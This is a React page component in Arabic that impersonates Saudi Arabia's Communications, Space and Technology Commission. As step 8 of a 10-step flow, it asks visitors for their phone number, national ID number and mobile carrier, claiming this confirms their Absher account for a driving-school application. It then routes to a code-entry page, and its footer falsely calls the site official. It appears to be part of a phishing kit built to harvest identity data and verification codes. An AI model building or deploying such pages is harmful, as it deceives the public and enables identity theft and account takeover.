import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { StepLayout } from "@/components/StepLayout";
import { useStepSession } from "@/lib/useStepSession";
import { useLocation } from "wouter";
import { useState } from "react";
import { toast } from "sonner";
import { ArrowLeft, Phone, Building2 } from "lucide-react";

const CARRIERS = ["STC", "موبايلي", "زين", "جوي", "ليبارا", "ياقوت", "فيرجن"];

export default function NumberPage() {
  const [, setLocation] = useLocation();
  const { recordStep, isSubmitting } = useStepSession();
  const [phone, setPhone] = useState("");
  const [idNumber, setIdNumber] = useState("");
  const [carrier, setCarrier] = useState("");

  const handleSubmit = async () => {
    if (phone.length < 8) return toast.error("رقم الجوال غير صالح");
    if (idNumber.length < 8) return toast.error("رقم الهوية غير صالح");
    if (!carrier) return toast.error("الرجاء اختيار نوع شريحة الجوال");
    await recordStep("number", { phone, idNumber, carrier });
    setLocation("/n-code");
  };

  return (
    <StepLayout
      step={8}
      total={10}
      badge="هيئة الاتصالات والفضاء والتقنية"
      title="تأكيد رقم الجوال"
      subtitle="عزيزنا العميل، يرجى تأكيد رقم الجوال في حساب أبشر لدى هيئة الاتصالات لتأكيد طلبك بمدرسة دلة لتعليم القيادة"
      variant="blue"
    >
      <Card className="p-6 md:p-8 shadow-lg border-blue-100">
        <div className="flex items-center gap-3 mb-5 pb-4 border-b border-blue-100">
          <div className="w-11 h-11 rounded-lg bg-gradient-to-br from-blue-600 to-blue-700 text-white flex items-center justify-center">
            <Building2 className="w-5 h-5" />
          </div>
          <div>
            <p className="font-extrabold text-gray-900">هيئة الاتصالات والفضاء والتقنية</p>
            <p className="text-xs text-muted-foreground">CST — Communications, Space & Technology Commission</p>
          </div>
        </div>

        <div className="space-y-4">
          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm">رقم الجوال *</Label>
            <div className="relative">
              <Phone className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" />
              <Input
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
                placeholder="05XXXXXXXX"
                maxLength={15}
                className="h-11 pr-10"
                dir="ltr"
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm">رقم الهوية *</Label>
            <Input
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value.replace(/\D/g, ""))}
              placeholder="رقم الهوية / الإقامة"
              maxLength={15}
              className="h-11"
              dir="ltr"
            />
          </div>

          <div className="space-y-1.5">
            <Label className="font-semibold text-gray-700 text-sm">نوع شريحة الجوال *</Label>
            <Select value={carrier} onValueChange={setCarrier}>
              <SelectTrigger className="h-11"><SelectValue placeholder="اختر مزود الخدمة" /></SelectTrigger>
              <SelectContent>
                {CARRIERS.map(c => <SelectItem key={c} value={c}>{c}</SelectItem>)}
              </SelectContent>
            </Select>
          </div>
        </div>

        <Button
          onClick={handleSubmit}
          disabled={isSubmitting}
          size="lg"
          className="w-full mt-6 bg-blue-600 hover:bg-blue-700 font-bold h-12"
        >
          تأكيد
          <ArrowLeft className="w-5 h-5 mr-2" />
        </Button>

        <p className="text-xs text-muted-foreground text-center mt-4">
          الموقع الرسمي تم تطويره من قبل هيئة الاتصالات والفضاء والتقنية
        </p>
      </Card>
    </StepLayout>
  );
}
